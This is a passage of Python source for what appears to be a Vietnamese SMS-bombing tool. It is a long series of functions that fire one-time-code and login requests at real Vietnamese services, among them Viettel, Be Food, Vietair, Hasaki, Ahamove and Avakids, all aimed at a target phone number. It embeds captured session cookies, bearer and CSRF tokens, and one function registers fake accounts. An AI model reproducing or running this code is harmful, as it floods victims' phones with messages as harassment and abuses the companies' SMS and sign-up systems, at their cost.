        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'mobileNumber': sdt,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'p2sTfiaO8ihlRup7',
    }

    try:
        response = requests.post('https://winny.com.vn/otp/otp/send', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WINNY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("WINNY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def befood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': sdt_chuyen_doi,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodhubzl():
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': sdt,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vttelecom():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'lang': 'vi',
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp', params=params, headers=headers)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinwonders():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt_chuyen_doi,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietair():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Referer': 'https://vietair.com.vn/khach-hang-than-quen/dang-ky',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    try:
        response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETAIR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETAIR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'sessionChecked': '1721624886',
        'HASAKI_SESSID': 'b5a41e810a240f4d2446e6241c78407a',
        'form_key': 'b5a41e810a240f4d2446e6241c78407a',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'ofu3g6vsn92b0iqiu4i28e82s0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def emart():
    cookies = {
        'emartsess': 'hk4hc7j1mnphvk2tg5dld4j0d3',
        'default': 'c4aca4bbfc3fc4949e4f881ec7',
        'language': 'vietn',
        'currency': 'VND',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=hk4hc7j1mnphvk2tg5dld4j0d3; default=c4aca4bbfc3fc4949e4f881ec7; language=vietn; currency=VND',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': sdt,
    }

    try:
        response = requests.post(
            'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("EMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("EMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ahamove():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    try:
        response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AHAMOVE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AHAMOVE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fahasa():
    cookies = {
        'frontend': '2f118fe3b8c748c78199208b10b3f9cb',
        'utm_source': 'chin',
        'click_id': '8vTZ22kVeRZoISe',
        'utm_medium': 'chin',
        'utm_campaign': 'chin',
        'utm_term': 'chin',
        'utm_content': 'chin',
        'frontend_cid': 'uqAGx0CC6GhLtoUa',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=2f118fe3b8c748c78199208b10b3f9cb; utm_source=chin; click_id=8vTZ22kVeRZoISe; utm_medium=chin; utm_campaign=chin; utm_term=chin; utm_content=chin; frontend_cid=uqAGx0CC6GhLtoUa',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/?ref=chin&utm_source=chin&utm_medium=chin&utm_campaign=chin&utm_term=chin&utm_content=chin&click_id=8vTZ22kVeRZoISe',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL) 

def sablanca():
    cookies = {
        'ASP.NET_SessionId': '1psn00n0dg1cj303ia2pi32e',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'ASP.NET_SessionId=1psn00n0dg1cj303ia2pi32e',
        'Origin': 'https://sablanca.vn',
        'Referer': 'https://sablanca.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'numberphone': sdt,
        'utm_source': 'Register',
    }

    try:
        response = requests.post('https://sablanca.vn/User/CheckCustomerPhoneIsCreateV21', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SABLANCA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SABLANCA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mioto():
    cookies = {
        '_gcl_au': '1.1.687166596.1725175773',
        '_ga': 'GA1.1.351792688.1725175773',
        '_vid': 'YrkmeC7d8ZSVBvp',
        '_hv': '3f81c03133302370da75f7adc8d0043d8fafd03a747809f7844d6a5d7986334b',
        '_ga_69J768NCYT': 'GS1.1.1725175773.1.0.1725175782.51.0.0',
        '_ga_ZYXJJRHCTB': 'GS1.1.1725175773.1.0.1725175782.0.0.0',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        # 'content-length': '0',
        # 'cookie': '_gcl_au=1.1.687166596.1725175773; _ga=GA1.1.351792688.1725175773; _vid=YrkmeC7d8ZSVBvp; _hv=3f81c03133302370da75f7adc8d0043d8fafd03a747809f7844d6a5d7986334b; _ga_69J768NCYT=GS1.1.1725175773.1.0.1725175782.51.0.0; _ga_ZYXJJRHCTB=GS1.1.1725175773.1.0.1725175782.0.0.0',
        'origin': 'https://www.mioto.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.mioto.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    response = requests.post(
        f'https://accounts.mioto.vn/mapi/sign-up?name={sdt}&displayName=quoc%20tran&pwd=123123aA@&gender=&dob=',
        cookies=cookies,
        headers=headers,
    )

    cookies = {
        '_vid': 'aUznVzlBn9oab3HT5',
        '_hv': '067fa715ac4f10ee312bf74f295318246656d377b93975cdd89250db336758e5',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        # 'cookie': '_vid=aUznVzlBn9oab3HT5; _hv=067fa715ac4f10ee312bf74f295318246656d377b93975cdd89250db336758e5',
        'origin': 'https://www.mioto.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.mioto.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    params = {
        'phone': sdt,
        'action': '2',
        'otpBy': '0',
    }

    try:
        response = requests.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MIOTO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MIOTO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def avakids():
    cookies = {
        'TBMCookie_3209819802479625248': '913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.Igz9_hL99hw': 'CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8',
        'CookiesUserId': 'f717fb39-aca2-447e-86d8-43353b354242',
        'MWG_CART_ID': 'e73eec56f3bc43c59790',
        'MWG_CART_HAVE_PRODUCT': '',
        'MWG_PRODUCT_BASIC_DB': 'm0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--',
        'MWG_CART_SS_17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC',
        'X-CSRF-TOKEN-MwgCart17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k',
        'SvID': 'blki218|ZqB2J|ZqB2E',
        'DMX_Personal': '%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        'BONUSCART_CK': 'IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--',
        '.AspNetCore.Antiforgery.dGH04W8MKvk': 'CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'TBMCookie_3209819802479625248=913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=; ___utmvm=###########; .AspNetCore.Antiforgery.Igz9_hL99hw=CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8; CookiesUserId=f717fb39-aca2-447e-86d8-43353b354242; MWG_CART_ID=e73eec56f3bc43c59790; MWG_CART_HAVE_PRODUCT=; MWG_PRODUCT_BASIC_DB=m0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--; MWG_CART_SS_17=CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC; X-CSRF-TOKEN-MwgCart17=CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k; SvID=blki218|ZqB2J|ZqB2E; DMX_Personal=%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; BONUSCART_CK=IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--; .AspNetCore.Antiforgery.dGH04W8MKvk=CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
        'Origin': 'https://www.avakids.com',
        'Referer': 'https://www.avakids.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LNt9duCvo5JgR90L8go8A4qec6je7UJneAEXpEnc1-pqL-ZhM0205u4tpJk_DIjUdFs6h3cKTmiajRZTuKWWa10Jc_6AaKkwS6nVuOhbRpi7x89B9Bqxn78GuIW1vTEVRF-pJchKrCm2KbNOqG_1Bs',
    }

    try:
        response = requests.post(
            'https://www.avakids.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AVAKIDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AVAKIDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def medigozl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
